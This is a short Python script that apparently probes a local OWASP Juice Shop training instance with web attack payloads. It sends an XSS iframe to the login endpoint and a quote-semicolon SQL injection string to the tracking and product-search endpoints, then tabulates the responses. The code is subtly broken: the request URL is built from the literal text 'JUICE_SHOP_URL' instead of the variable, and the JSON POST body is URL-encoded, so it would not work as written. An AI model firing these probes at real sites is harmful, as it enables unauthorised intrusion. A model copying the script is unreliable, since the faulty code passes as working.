import requests
import urllib

JUICE_SHOP_URL = "http://192.168.1.119:3000"

def send_request(endpoint, command, payload, headers = None):
    url = f"JUICE_SHOP_URL{endpoint}"

    payload = urllib.parse.quote(payload)

    if "POST" == command:
        headers = {"Content-Type": "application/json"}
        response = requests.post(url, data=payload, headers=headers)
    elif "GET" == command:
        response = requests.get(url + payload)

    return response

def scan_endpoints():
    endpoints = [
        {"endpoint": "/rest/user/login", "command": "POST", "payload": "{\"email\": \"<iframe src=javascript:alert(1)>\", \"password\": \"any_password\"}"},
        {"endpoint": "/track-result?id=", "command": "GET", "payload": "';"},
        {"endpoint": "/rest/products/search?q=", "command": "GET", "payload": "';"}
    ]

    print(f"{'Endpoint':<30} | {'HTTP Method':<15} | {'Payload':<80} | {'Status Code':<15} | {'Response Length':<15}")
    print("-" * 170)
    
    for endpoint in endpoints:
        response = send_request(endpoint["endpoint"], endpoint["command"], endpoint["payload"])
        print(f"{endpoint['endpoint']:<30} | {endpoint['command']:<15} | {endpoint['payload']:<80} | {response.status_code:<15} | {len(response.text):<15}")

if __name__ == '__main__':
    scan_endpoints()